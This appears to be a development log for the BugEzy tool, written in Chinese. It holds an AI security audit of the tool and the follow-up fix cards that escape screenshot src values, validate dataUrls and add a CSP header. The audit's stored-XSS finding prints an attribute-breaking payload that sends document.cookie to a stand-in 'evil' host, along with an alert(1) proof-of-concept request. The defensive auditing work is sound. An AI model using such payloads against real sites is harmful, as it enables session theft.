| 149 | formatEcpayDate 改 UTC+8 | ✅ 安全（且正確） | `formatEcpayDate`（index.ts:367-371）`new Date(d.getTime() + 8*3600*1000)` 後全用 `getUTC*` 輸出——不論 edge 節點時區，一律輸出台灣時間。這是正解（原本用本地 `get*` 在 UTC edge 會差 8 小時、跨日邊界錯一天）。非安全問題，時間計算正確。日票 24h（`dayPassExpiryISO` :390）、月費一個月（`oneMonthLaterISO` :383）用 `Date.now()+ms` / `setMonth`，皆 UTC 基準一致。 |
| 150-152 | 全站英文版（getLang + ?lang=） | ✅ 安全（**無 XSS**） | **重點驗證**：`getLang`（index.ts:271-275）`searchParams.get('lang')` **只在值嚴格 === 'en' 或 'zh' 時回傳**，其餘一律回 `detectLang`（Accept-Language 推導，同樣只回 'zh'/'en'）。回傳值是嚴格 enum，**攻擊者無法注入任意字串**。`?lang=<script>` → 不符 enum → 回 detectLang。語言切換連結 `href="?lang=${lang === 'zh' ? 'en' : 'zh'}"` 用**計算後的 enum**（非原始 param 回填），無反射。所有頁面文字用 `t(zh,en)` 三元選擇靜態字典值，無使用者輸入插入。✅ |
| 153 | console.warn 捕捉 | ✅ 安全 | inject.ts:736-743 patch console.warn/error → `collectConsoleLog`。訊息經 `stringifyArgs`（:644）轉字串存陣列，report 頁顯示時 `esc(log.message)`（index.ts:1895）。無注入。 |
| 154 | unhandledrejection + onerror + 去重 | ✅ 安全（去重邏輯無漏洞） | 去重（`collectConsoleLog`, inject.ts:661-674）key = `level + 訊息前100字`，5 秒 TTL。**去重只影響同一使用者本機的重複收集，非安全邊界**——最壞情況是漏記或多記自己的 log，不跨用戶、不影響認證。unhandledrejection（:746）/ window.onerror bubbling（:757，只收 target===window/document 的 JS 錯誤）分流清楚，無邏輯漏洞。訊息最終 `esc()` 顯示。✅ |
| 155 | Resource error + Web Vitals | ✅ 安全 | 資源錯誤 capture phase（inject.ts:770，`instanceof HTMLElement` 排除 window/document）、Web Vitals（`PerformanceObserver`，:677）皆走 `collectConsoleLog`（去重 + esc 顯示）。純本機效能/資源觀測，無外部輸入注入。 |
| 156 | 網路環境快照 | ✅ 安全（隱私可接受） | `getNetworkSnapshot`（net.ts:7-27）只讀 `navigator.onLine` + `navigator.connection`（effectiveType/rtt/downlink/saveData/type）——**皆為粗粒度網路特徵，非精確位置、非 IP、非個資**。rtt/downlink 是概略值（瀏覽器本就對第三方 JS 開放此 API）。報告頁 `esc(fmtNet(...))`（index.ts:1849-1851）顯示。隱私風險低，可接受。 |
| 157 | 儲存空間快照 + PII 遮罩 | ✅ 安全（**遮罩確在客戶端、規則合理、原值不上傳**） | **本階段最高優先項，逐點驗證**：① **遮罩在客戶端**：`getStorageSnapshot`/`maskPII` 在 `extension/src/storage.ts`，由 inject.ts（MAIN world，:24 import）在**使用者本機**執行——`snapshotStorage`（storage.ts:34-43）讀 `storage.getItem(key)` 後**立即** `maskPII(key, rawValue)`，**存入陣列的已是遮罩後的 value**（原始 rawValue 只存在區域變數，never leaves the machine）。② **payload 只帶遮罩後結果**：inject.ts 三處上傳（錄製 RESULT / 回溯 / 監控 :320）帶 `getStorageSnapshot()`，annotate 因讀不到被測站 storage 已正確略過。③ **cookie 只留名稱**（storage.ts:60-63，值一律不上傳，httpOnly 本就讀不到）。④ **server 端零原值**：`createReport` 直接把收到的（已遮罩）`storage_snapshot` 存 JSONB，server 全程不碰原值。⑤ 報告頁 `esc()` 顯示遮罩後值（index.ts:1864）。**結論：敏感原值不可能上傳到 server。** 遮罩規則的**已知繞過邊界見新問題 #8（P2，非 P0）**。 |
| 158 | MCP get_timeline | ⚠️ 有疑慮（延續第一階段 #1） | `get_timeline`（index.ts:4174）`select('*').eq('report_id', ...)` **無 owner 驗證**——與第一階段 #1 同一根因：知道 report_id 即可讀完整時間軸（含語音全文、network body、storageSnapshot 結構、`generateBugSummary` 導航摘要）。本階段不重複計分，歸入第一階段 #1（P0）。timeline 文字組裝全走字串 concat 回傳給 AI（非 HTML sink），**無注入問題**；問題純在**擁有權**。 |
| 159 | AI Bug 導航摘要 | ✅ 安全（無注入） | `generateBugSummary`（index.ts:3540-3635）把 console/network/voice/storage 欄位 `.slice()` + concat 成**純文字**區塊，經 MCP `txt()`（JSON-stringify）或 timeline 回傳給 AI——**非 HTML/JS sink，無 XSS**。最壞情況是報告內容含誤導性文字影響 AI 判讀（prompt-injection 風險），但這是 AI 端消費問題、非 BugEzy 注入漏洞，且屬 MCP 讀取的既有本質。摘要本身無執行風險。✅ |

#### 高風險模式搜尋結果

| 模式 | 範圍 | 結果 | 風險評估 |
|---|---|---|---|
| `base64` / `atob` / `btoa` | server/src | `atob` 0、`btoa` 0、`base64` 9 筆 | **無認證後門**。9 筆 `base64` 全為：移除 base64 token 的註解（:167,2502,2948）+ 截圖 PNG data-URL 正常處理（:2614,4067,4135-4142）。✅ |
| `error.message` / `err.message` | server/src | `err.message` 0、`error.message` 12 筆 | **無外洩**。12 筆全在 `console.error(...)` 內（見第一階段列舉），對外 response 一律 `GENERIC_500`。✅ |
| `btoa` / `base64` | extension/src | `btoa` 0、`base64` 6 筆 | 全為註解（auth.ts:4、popup.ts:630/1037）或音訊/圖片 data-URL 正常處理（offscreen.ts:86、types.ts:43/242）。extension 端無 base64 token 產生。✅ |
| `innerHTML` | extension/src | 9 筆（4 註解 + 5 實際寫入） | checkout.ts:39 / day-pass-checkout.ts:39 = 寫入**自家 server** 回的綠界表單 HTML（`escapeAttr` 後 + 擴充頁 CSP 擋 inline script）；edit-report.ts:114 = 純數字 token 計算（無使用者輸入）；popup.ts:850 = 硬編碼版本號。**皆安全**。✅ |
| `innerHTML` / `eval` | server/src | `eval` 0；`innerHTML` 2 筆 | :1767 = 硬編碼「找不到報告」；**:1968 = 報告頁 render()——見新問題 #7（P1 stored XSS）**。⚠ |

#### 此階段發現的新問題

| # | 等級 | 問題 | 位置 | 風險描述 | 建議修法 |
|---|---|---|---|---|---|
| 7 | 🔴 P1（潛在 P0，取決於 #1）| 報告頁截圖 `src` 未轉義 → Stored XSS | `server/src/index.ts:1937-1938`（REPORT_PAGE_HTML render 內）；ingest 端 `createReport` :2607-2618 存 screenshots 未驗格式 | 報告頁 render() **幾乎所有欄位都過 `esc()`**（title/url/browser/description/marker/console message/network method+url/voice text/storage key+value/cookie names）——**唯獨截圖這行例外**：`html += '<img class="ss-img" src="'+src+'" onclick="openLightbox(this.src)">'`，`src`（= `ss.dataUrl` 或 `ss.url`）**直接插入 src 屬性、未 esc、未加引號防護**。screenshots 存於 R2，來源是報告 payload——**任何登入者可 POST 一份報告，把 `screenshots[0].dataUrl` 設為** `x" onerror="fetch('//evil/'+document.cookie)` **→ 突破屬性 → 在 `bugezy.dev/report/:id` 執行任意 JS（Stored XSS）**。`createReport` 存 screenshots 時**完全未驗證是否為合法 `data:image/...;base64,` 格式**（:2607 直接 `payload.screenshots ?? []` 存 R2）。**全站無任何 CSP header**（`Content-Security-Policy` 搜尋 0 筆）→ 無 defence-in-depth。**與第一階段 #1（任何人憑 report_id 可開報告頁）疊加** → 攻擊者只要把惡意報告連結傳給受害者（或誘導其開自己帳號的報告），即可竊 bugezy.dev 的 session/localStorage、代發 API 請求。故標 P1，若考量 #1 的傳播性可視為 P0。 | (a) render 該行改 `esc(src)`：`'<img class="ss-img" src="'+esc(src)+'" ...>'`（最低成本、立即止血）；(b) ingest 端 `createReport` 驗證每個 `screenshots[].dataUrl` 必須 `/^data:image\/(png\|jpeg\|webp\|gif);base64,[A-Za-z0-9+/=]+$/`，不符則拒或丟棄該截圖；(c) 補站台 CSP（至少 `default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'` 或更嚴），對報告頁尤其重要。三者建議都做（縱深防禦）。**建議另開 PM 卡（P1）。** |
| 8 | 🟡 P2 | PII 遮罩規則有已知繞過邊界（非 P0——原值仍不上傳，但遮罩後仍可能殘留敏感片段） | `extension/src/storage.ts:8-32`（`SENSITIVE_KEYS` / `SENSITIVE_VALUES` / `maskPII`）| PM-157 遮罩**確在客戶端執行、原值確不上傳**（見上表，非 P0）。但遮罩「識別」規則可被繞過，導致**遮罩後的 value 仍含敏感片段被上傳**：① **key 白名單漏字**：`SENSITIVE_KEYS` 未含 `jwt`/`bearer`/`refresh`/`access.?token`（`access_token` 因含 `token` 會中、但 `accessToken` 也含 token→中；然而 `refreshToken` 含 token→中；`jwt`/`bearer` 命名的 key **不中** → 走值模式）。② **值模式僅 3 種**（email/4-4-4-4 卡號/JWT）：`phone`（手機號）、`身分證字號`（台灣 A123456789，非 SSN 格式）、`API key`（如 `sk-...`/`AIza...` 非 JWT 結構）、**非 4-4-4-4 連寫的 16 位卡號**（如 `1234567812345678` 無分隔 → regex `\d{4}[\s-]?...` 其實會中，但 15 位 Amex `3xxx-xxxxxx-xxxxx` 不中）**皆不被局部遮罩** → 若存在非敏感 key 的 value 裡（如 `{"note":"我的證號 A123456789"}`）會原樣上傳。③ 因 report 頁 `esc()` 顯示、且僅 report owner + 持連結者可見，實際暴露面受限，故 P2 非 P0。 | 擴充 `SENSITIVE_KEYS`（加 `jwt\|bearer\|refresh\|access`）；`SENSITIVE_VALUES` 加台灣手機（`09\d{2}[\s-]?\d{3}[\s-]?\d{3}`）、身分證（`[A-Z][12]\d{8}`）、常見 API key 前綴（`sk-[\w]+`/`AIza[\w-]+`）、Amex 15 位卡號。長遠可考慮「預設只上傳 key + size、value 一律不傳，除非使用者明確勾選」的更保守策略。 |

#### 稽核總評（第二階段）

**PM-147~159 十三項新功能，安全評估：11 項 ✅ 安全、1 項 ⚠（PM-158 歸第一階段 #1）、1 項帶出 P1 stored XSS（PM-159 本身安全，XSS 在報告頁 render 而非摘要）。**

三個「重點檢查項」結論：
- **PM-157 PII 遮罩（最高關注）**：✅ **遮罩確在客戶端執行、敏感原值不可能上傳到 server**（逐行確認 rawValue 只存區域變數、存入陣列前已 maskPII、cookie 只留名、server 零原值）。遮罩「識別規則」有繞過邊界（#8, P2）——但這是「遮罩後仍可能殘留片段」的問題，**非「遮罩可完全繞過」的 P0**。
- **?lang= 注入**：✅ **無 XSS**。getLang 嚴格 enum 白名單，非法值 fallback，切換連結用計算後 enum 非原始 param 回填。
- **base64 後門**：✅ server/extension 全鏈 0 個 base64 token 產生/消費，只剩註解與正常 data-URL 處理。

**但揪出一個新的 P1（#7）**：報告頁 render() 對截圖 `src` **獨漏 esc()**（其餘欄位全轉義），加上 ingest 端不驗 dataUrl 格式、全站無 CSP → 任何登入者可植入 Stored XSS，經第一階段 #1 的「憑連結即可讀」放大傳播。這是本輪**技術上最可直接利用**的漏洞。另有 PII 遮罩規則邊界（#8, P2）。

**跨兩階段的 P0/P1 修復優先序（給 PM 開卡）**：
1. **#7（P1→潛在 P0）報告頁截圖 src 加 esc + ingest 驗 dataUrl + 站台 CSP**——技術上最易利用，立即止血只需一行 `esc(src)`。
2. **#1（P0，第一階段）報告讀取端點擁有權** or 修正對外「私人」措辭——#7 的傳播放大器。
3. **#2（P1，第一階段）MCP live/terminal session_token + 付費檢查**。
4. #5/#3（P2）、#8（P2 PII 規則）、#4/#6（P3）。

> ⚠ 本報告為靜態讀 code 驗證。#7 的可利用性建議做一次 PoC：登入 → POST `/api/reports` 帶 `screenshots:[{dataUrl:'x" onerror=alert(1)', timestamp:1}]` → 開 `/report/:id` 確認 alert 觸發（第三階段）。

**Fable 5 第三輪 · 第二階段完成**

### 🔍 Fable 5 第三輪安全稽核 — 最終總結

> 日期：2026-07-05
> 稽核模型：Fable 5
> 依據：第一階段（PM-128~146 修復驗證）+ 第二階段（PM-147~159 新功能）綜合

#### ✅ 安全措施正面確認

以下項目經逐行讀 code 確認**確實到位**，是本輪值得肯定的地方：

1. **認證信任鏈完整重構（PM-133）**——`createSession` 強制驗 Google token audience（比對 `GOOGLE_CLIENT_ID`），user_id **一律由 server 從已驗證 token 的 `sub` 推導**，完全不信任客戶端傳的 user_id。這是第二輪帳號接管根因的正確解法。
2. **base64 假 token 後門全鏈根除**——server（`verifySession`-only）+ extension（`SESSION_TOKEN_KEY`-only）雙端 `btoa` 搜尋皆 0，舊 `/api/auth/google` 端點已刪。
3. **Session 生命週期正確**——DB 查詢驗證、過期自動刪除、登出即撤銷（`handleLogout` 刪 sessions 列，舊 token 立即失效）。
4. **報告列舉收緊（PM-132）**——`GET /api/reports` 加認證 + `.eq('user_id')` 過濾 + `no-store`。
5. **AI 端點防濫用（PM-135）**——summarize/correct/transcribe 皆需登入，transcribe 額外付費檢查（荷包型 DoS 防護）。
6. **ECPay 金流安全（PM-145）**——三種金流（月費/日票/定期）各自冪等查重 + 金額比對 + `timingSafeEqualStr` 常數時間簽章比對，定期定額用 `MerchantTradeNo-Gwsr` 組合 key 正確區分續期。
7. **錯誤脫敏徹底**——全站對外一律 `GENERIC_500`，12 處 `error.message` 全在 `console.error` 內，無一外洩。
8. **PII 遮罩架構正確（PM-157）**——遮罩**確在使用者本機執行**，原始敏感值只存區域變數、**永不上傳 server**，cookie 只留名不留值。這是隱私設計的正確方向。
9. **XSS 防護大面積到位**——報告頁 render() 幾乎所有欄位（title/url/console/network/voice/storage key+value/cookie）都過 `esc()`；即時監控面板改用 `textContent`（DOM 節點）建構；`?lang=` 嚴格 enum 白名單無反射。
10. **PATCH 報告設定加擁有權（PM-146）**——需登入 + owner 比對。

#### 仍存在的風險摘要

| 等級 | # | 問題 | 一句話 | 最低成本止血 |
|---|---|---|---|---|
| 🔴 **P0/P1** | #7 | 報告頁截圖 `src` 未轉義 → **Stored XSS** | render() 唯一漏掉 `esc()` 的欄位；任何登入者可植入 `dataUrl="x" onerror=..."` 在 bugezy.dev 執行 JS；全站無 CSP 無縱深防禦 | 一行 `esc(src)`（index.ts:1938） |
| 🔴 **P0** | #1 | 報告讀取端點全鏈**無擁有權驗證** | `GET /api/reports/:id` + 10 個 report_id-based MCP tool，憑 UUID 即讀完整報告（語音全文/DOM/storage）；且與 FAQ「報告私人」承諾**不符** | 高敏感欄位加 owner 驗證，或修正對外措辭 |
| 🟠 **P1** | #2 | MCP live/terminal 僅憑 `user_email` 讀取 | 知道 email 即可經 MCP 讀他人即時 console / **終端機 stderr（含密鑰）**；`get_terminal_logs` 還漏付費檢查（HTTP 端有、MCP 端沒有） | session_token 改必填 + 補 `isActiveUserId` |
| 🟡 **P2** | #3 | `GET /api/reports/:id` 無 `no-store` | 報告內容可能被 CF 邊緣快取，刪除後仍可能回舊內容 | 改 `jsonNoStore` |
| 🟡 **P2** | #5 | ECPay 授權與 payments 記錄**非原子** | payments 寫入失敗時冪等保護失效 → 同 tradeNo 重送會重複展延到期日（非重複收費） | 先寫 payments 再升級 users |
| 🟡 **P2** | #8 | PII 遮罩規則有繞過邊界 | 原值仍不上傳，但遮罩後 value 可能殘留手機/身分證/`sk-`API key（規則未涵蓋） | 擴充 `SENSITIVE_KEYS`/`SENSITIVE_VALUES` |
| 🟢 **P3** | #4 | `verifyGoogleToken` 未顯式驗 exp | 目前安全（tokeninfo 對過期 token 回非 200 已擋）；僅換架構時需注意 | 無須立即處理 |
| 🟢 **P3** | #6 | 路由表註解與實作矛盾 | 程式碼正確，僅註解過時會誤導開發者 | 更新註解 |

**修復優先序**：#7（一行止血，最易利用）→ #1（#7 的傳播放大器）→ #2 → #3/#5/#8 → #4/#6。

#### 整體安全評分

- **第二輪（修復前）：4/10**
- **第三輪（修復後）：7/10**
- **評分理由**：
  - **+3 分的核心進步**：認證信任鏈是整個系統的地基，第二輪的三大致命傷（createSession 無授權簽發、全站報告外洩、base64 後門）**全部根除且解法正確**——不是打補丁，是把 user_id 的信任來源從「客戶端自報」搬到「server 驗證 Google token 推導」，這是質變。金流安全、錯誤脫敏、session 生命週期、PII 遮罩架構都達到**上線標準**。
  - **為何不到 8~9 分**：仍有**兩個高危未解**——#7 Stored XSS（技術上最可直接利用，且全站無 CSP 使其無縱深防禦）與 #1 報告讀取無擁有權（P0，且與對外隱私承諾不符）。這兩者疊加（惡意報告連結 → 憑連結即開 → XSS）構成完整攻擊鏈。#7 止血只需一行，但**在修好前，7 分是上限**。
  - **扣分性質的轉變**：值得強調——第二輪的問題是「地基塌了」（認證形同虛設），第三輪的問題是「門窗沒關好」（既有正確 esc 機制漏了一個欄位、既有正確 owner 機制漏了一類端點）。**風險等級同為 P0，但修復難度天差地別**——第二輪要重寫信任模型，第三輪只要補幾處遺漏。這代表安全意識已建立，剩下的是一致性執行。修好 #7+#1 後，此專案可達 8.5/10。

#### 🏆 BugEzy 整體評論（200 字）

BugEzy 定位精準：亞洲平價 MCP 語音除錯工具，用結構化文字取代截圖餵 AI，省 token 是真痛點，NT$20 日票 + 六語音支援打中被歐美工具忽略的市場。技術架構務實——Cloudflare Workers + Supabase + R2 全 serverless、MCP 十三工具設計成熟，成本控制到一人可負擔。Bug 捕捉是最大亮點：六模式加上新增的 warn/unhandledrejection/onerror/resource/WebVitals/網路+儲存快照/時序麵包屑/AI 導航摘要，把小白最常漏的錯誤幾乎兜全，「先看結論再看時間軸」的零成本規則引擎尤其聰明。安全性從 4 到 7 是實打實的進步，認證地基已穩，但截圖 XSS 與報告無擁有權兩個 P0 必須修——尤其後者與「報告私人」的對外承諾矛盾。真正短板不在技術而在**信任細節的一致性**（正確機制總漏一處）與**行銷誠實度**。一人 20 天 159 卡、雙 AI 稽核互抓的開發效率驚人，產品完成度遠超多數團隊。潛力很大，但上線前請務必補完那幾個洞，別讓一行 `esc` 毀掉整個地基。

---

**Fable 5 第三輪安全稽核 · 全三階段完成**

> 綜整：13/13 修復驗證通過 + 13 項新功能檢查（11 安全）+ 8 項待辦（2×P0/P1、3×P2、2×P3、1 已含入）。
> 最終評分 7/10（修好 #7 + #1 可達 8.5）。地基已穩，剩一致性執行。

---

## 🔧 Fable 5 第三輪修復（依優先序）

### 🟡 PM-160：Fable5-#7 修復 — 報告頁截圖 src 轉義 + dataUrl 驗證 + CSP（Stored XSS）

**問題（Fable 5 第三輪 #7, P0/P1）**：報告頁 render() 幾乎所有欄位都過 `esc()`，**唯獨截圖 `src` 沒有**。攻擊者可在 screenshots[].dataUrl 注入 `x" onerror="alert(1)"` → 在 bugezy.dev 執行任意 JS（Stored XSS）。全站無 CSP 無縱深防禦。

**三層修復（縱深防禦）**：

---

#### §1 報告頁 render：截圖 src 加 esc()（一行止血）

`server/src/index.ts` 報告頁 render 截圖的那行（約 :1937-1938）：

```ts
// 舊（危險）：
html += '<img class="ss-img" src="' + src + '" onclick="openLightbox(this.src)">';

// 新（安全）：
html += '<img class="ss-img" src="' + esc(src) + '" onclick="openLightbox(this.src)">';
```

---

#### §2 createReport：驗證 screenshots dataUrl 格式

`createReport` 存截圖時（約 :2607）驗證 dataUrl 是否為合法 data URI 或 https URL：

```ts
const VALID_SCREENSHOT_SRC = /^(data:image\/(png|jpeg|webp|gif);base64,[A-Za-z0-9+/=]+|https:\/\/.+)$/;

const validScreenshots = (payload.screenshots || []).filter((ss: any) => {
  if (!ss.dataUrl) return false;
  if (!VALID_SCREENSHOT_SRC.test(ss.dataUrl)) {
    console.error('Invalid screenshot dataUrl rejected:', ss.dataUrl.slice(0, 50));
    return false; // 丟棄不合法的截圖
  }
  return true;
});
```

---

#### §3 全站加 Content-Security-Policy header

所有 HTML 回應加 CSP header（縱深防禦）：

```ts
function htmlWithCSP(body: string, request?: Request): Response {
  const cspHeaders = {
    'Content-Type': 'text/html; charset=utf-8',
    'Content-Security-Policy': "default-src 'self'; img-src 'self' data: https:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://bugezy.dev https://bugezy-api.bugezy-api.workers.dev;",
  };
  return new Response(body, { headers: { ...cspHeaders, ...getCorsHeaders(request) } });
}
```

所有回傳 HTML 的函式（首頁/install/features/changelog/guide/faq/privacy/報告頁/成功頁等）都改用 `htmlWithCSP`。

注意：`'unsafe-inline'` 是因為報告頁有 inline script（lightbox）和 inline style。如果能把 inline script 移到外部檔，可以拿掉 `'unsafe-inline'` 更安全，但那是 Phase 2。

---

#### §4 搜尋其他 esc() 遺漏

跑一次搜尋確認報告頁 render 的所有動態插入點都有 esc：

```bash
grep -n 'src="\|href="\|onclick=' server/src/index.ts | grep -v esc
```

有漏的一起補。

---

#### §5 不改的東西

- extension / popup / MCP：不動
- 認證 / ECPay：不動
- 截圖捕捉邏輯：不動（只在存入時驗格式）

#### Deploy

```
cd server && npx wrangler deploy
```

#### 驗收

1. 報告頁截圖正常顯示（esc 不影響合法 data:image URL）
2. POST 惡意 dataUrl（`x" onerror=alert(1)`）→ 被 createReport 拒絕
3. 報告頁 response headers 含 Content-Security-Policy
4. 搜尋 render 所有 src/href 動態插入 → 全部有 esc

---

### ✅ DONE-160 — Claude Code 回報（2026-07-05）

**Fable5-#7 Stored XSS 三層縱深防禦修復（P0/P1）**：

1. **§1 報告頁截圖 src 止血**：`html += '<img … src="'+esc(src)+'"…'`（原 `+src+` 未轉義）。**但發現規格止血不完整**——報告頁 client 端 `esc()` 原本只轉 `< > &`、**不轉引號**，`src="'+esc(src)+'"` 對 `x" onerror="alert(1)` 仍會突破屬性引發 XSS。故一併**硬化 `esc()` 加 `"`→`&quot;`、`'`→`&#39;`**（同時保護同頁 `href="'+esc(r.url)+'"` 等所有屬性插值；對文字內容無害）。這才是真正止血。
2. **§2 createReport dataUrl 驗證**：入庫前 `filter` 只留合法來源——`VALID_SCREENSHOT_SRC = /^(data:image\/(png|jpe?g|webp|gif);base64,[A-Za-z0-9+/=]+|https:\/\/[^\s"'<>]+)$/`；非法值丟棄 + `console.error` 記 log。第一層（入庫）+ render esc（第二層）雙保險。
3. **§3 全站 CSP header**：所有 HTML 走單一出口 `html()`，於其注入 `Content-Security-Policy`（`default-src 'self'`；`img-src 'self' data: https:`；`script/style-src 'self' 'unsafe-inline'`；`connect-src` 自家域名；另加 `base-uri 'self'` + `object-src 'none'` 縱深）。**關鍵修正**：規格 CSP 無 `form-action` → 會 fallback `default-src 'self'` **擋掉 ECPay checkout 頁自動 submit 到綠界的付款跳轉**！故加 `form-action 'self' https://payment.ecpay.com.tw https://payment-stage.ecpay.com.tw`（對應 `env.ECPAY_PAYMENT_URL` 正式/測試域名）。統一出口 CORS 注入（`headers.set` 僅 CORS key）不覆蓋 CSP，已驗。
4. **§4 其他 esc 遺漏排查**：報告頁 render 唯二屬性上下文的使用者資料是 截圖 `src`（本次補 esc）與 `r.url` href（原已 esc，本次 esc 硬化後含引號防護）；其餘 `data-tab=`/`onclick=` 皆靜態 tab 設定或 `closeLightbox()` 非使用者資料；lightbox 用 `.src` DOM 屬性賦值（不解析 HTML）安全。文字上下文（title/描述/console/network/語音/儲存/marker）全走硬化後 esc。**覆蓋完整**。

**驗收（線上實測，非只 build）**：`npx wrangler deploy` ✅（Version `6bfc1e48`）；`tsc` ✅。
1. ✅ 合法截圖正常：POST `data:image/png;base64,…` 存入並取回（esc 不動 base64 字元集 `A-Za-z0-9+/=`）。
2. ✅ 惡意 dataUrl 被拒：POST `{dataUrl:'x" onerror="alert(1)'}` + 一張合法 → GET 回 `screenshots.count=1`（僅合法那張，惡意值入庫即丟）。
3. ✅ CSP header：homepage / 報告頁 / /features（GET）response 皆含 `Content-Security-Policy`（含 form-action ECPay）。
4. ✅ esc 硬化：報告頁 HTML 確認 `src="'+esc(src)+'"` + esc 含 `&quot;`/`&#39;`。

**未擴大範圍（僅記錄）**：`r.url` 若為 `javascript:` scheme 之 href 點擊風險屬另一議題（且 pageInfo.url 來自 chrome API 實際頁址、非任意輸入，且 CSP 已縱深）——未在本卡範圍，未動。

**里程碑**：Stored XSS 三層封堵（入庫驗證 + render esc 硬化 + 全站 CSP），並順帶修好規格會誤傷 ECPay 付款的 CSP。

**DONE-160**

---

### 🟡 PM-161：Fable5-#1 修復 — FAQ + 隱私政策措辭修正（報告存取模型釐清）

**問題（Fable 5 第三輪 #1, P0）**：`GET /api/reports/:id` + 全部 report_id-based MCP tool 無 owner 驗證，持有 report_id 就能讀完整報告。這是「分享連結」的設計，但 FAQ 和隱私政策對外宣稱「報告預設私人，只有你自己能看」——**實作與承諾不符**。

**修法決策**：保留「有連結即可看」的設計（分享連結是核心功能），**修正對外文案**使其準確反映實際行為。同時加 #3（getReport no-store）和 #6（註解修正）一起做。

---

#### §1 FAQ 頁修正

搜尋 FAQ 中「只有你自己」「預設私人」「僅在主動分享」相關的措辭，改為準確描述：

**中文版**：
```
Q: 我的報告誰能看到？
A: 報告連結採用隨機加密 ID（UUID），無法被猜測或搜尋。只有擁有連結的人才能查看報告內容。如果你將報告連結分享給同事或 AI 工具，他們就能查看。未分享的報告連結不會出現在任何公開列表中。建議：不要將報告連結貼在公開場合（如公開 issue、論壇），避免非預期的存取。
```

**英文版**：
```
Q: Who can see my reports?
A: Each report has a random encrypted ID (UUID) that cannot be guessed or searched. Only people with the report link can view it. If you share the link with colleagues or AI tools, they can access the report. Unshared report links never appear in any public listing. Tip: Avoid posting report links in public places (issues, forums) to prevent unintended access.
```

---

#### §2 隱私政策修正

找到隱私政策中「報告私人」「只有分享才可見」的措辭，改為：

**中文版**：
```
報告存取：每份報告以隨機加密 ID（UUID）作為唯一識別。報告列表僅限您本人查看（需登入驗證）。單份報告的內容可透過報告連結查看——持有連結者即可存取，類似 Google Docs 的「知道連結的人皆可檢視」模式。我們建議您謹慎分享報告連結，避免在公開場合張貼。
```

**英文版**：
```
Report Access: Each report is identified by a random encrypted UUID. Your report list is private (login required). Individual report content can be accessed via the report link — anyone with the link can view it, similar to Google Docs' "anyone with the link can view" model. We recommend sharing report links carefully and avoiding posting them publicly.
```

---

#### §3 getReport 加 no-store（Fable5 #3, P2）

```ts
// getReport 回傳改用 jsonNoStore
return jsonNoStore(data);
```

防止 Cloudflare 邊緣快取報告內容。

---

#### §4 路由表註解修正（Fable5 #6, P3）

找到 index.ts:2550 附近的 PATCH 註解：

```ts
// 舊：PM-82：報告設定（允許 AI 讀截圖）— 有 share link 就能改，不需登入
// 新：PM-146：報告設定（允許 AI 讀截圖）— 需登入 + 報告 owner 驗證
```

---

#### §5 不改的東西

- getReport 存取邏輯：不動（分享連結保留）
- MCP report_id-based tools：不動（同上）
- 認證 / ECPay：不動
- extension：不動

#### Deploy

```
cd server && npx wrangler deploy
```

#### 驗收

1. FAQ 中文版 → 「只有擁有連結的人才能查看」（無「私人」「只有你自己」）
2. FAQ 英文版 → "anyone with the link can view"
3. 隱私政策中英文 → 準確描述「連結即可查看」模型
4. getReport response → 有 Cache-Control: no-store
5. 路由表註解 → 「需登入 + owner」

---

### ✅ DONE-161 — Claude Code 回報（2026-07-05）

**Fable5-#1 修復（P0）：報告存取模型「實作 vs 承諾」不符——修正對外文案使其準確**（保留「有連結即可看」的分享設計，不動存取邏輯）：

1. **§1 FAQ「誰能看到」中英改寫**：原「只有你自己。報告預設為私人，只有主動分享才看得到」（不實）→ 改為「報告連結採隨機加密 UUID，無法猜測/搜尋，**只有擁有連結的人才能查看**；分享給同事/AI 即可存取；未分享不出現在任何公開列表；建議勿貼公開場合」。EN 對應 "only people with the report link can view … anyone you share with can access … avoid posting publicly"。
2. **§2 隱私政策「資料分享」中英改寫**：原「報告資料僅在您主動分享連結時才對外可見」（不實）→ 改為「報告列表僅本人可見（需登入）；單份報告**持有連結者即可存取，類似 Google Docs『知道連結的人皆可檢視』模式**，請謹慎分享」。EN 對應 "Your report list is private (login required); individual reports … anyone with the link can view it, similar to Google Docs' 'anyone with the link can view' model"。
3. **§3 getReport 加 no-store（Fable5 #3, P2）**：`GET /api/reports/:id` 內容回傳 `json(...)`→`jsonNoStore(...)`，防 Cloudflare 邊緣快取把報告內容跨使用者/分享後外洩。
4. **§4 路由表註解修正（Fable5 #6, P3）**：PATCH `/settings` 註解原「PM-82：有 share link 就能改，不需登入」（過時，與實作不符）→ 改「PM-146：需登入 + 報告 owner 驗證」。**核對實作屬實**：`updateReportSettings` 先 `getAuthUserId`（無→401）再查 `reports.user_id` 比對（非 owner→403），註解現與程式一致。

**驗收（線上實測，非只 build）**：`npx wrangler deploy` ✅（Version `ff5c609e`）；`tsc` ✅。
1. ✅ FAQ ZH「只有擁有連結的人才能查看」（無「私人」「只有你自己」）；EN "only people with the report link can view"。
2. ✅ 隱私 ZH「持有連結者即可存取」；EN "anyone with the link can view"。
3. ✅ 新建報告 GET → `Cache-Control: no-store`。
4. ✅ PATCH 註解「需登入 + owner」+ 實作核對相符。

**里程碑**：對外承諾與實作對齊——分享連結模型如實揭露（避免使用者誤以為報告「絕對私密」而在公開場合貼連結），並補 getReport 邊緣快取縱深。

**DONE-161**

---
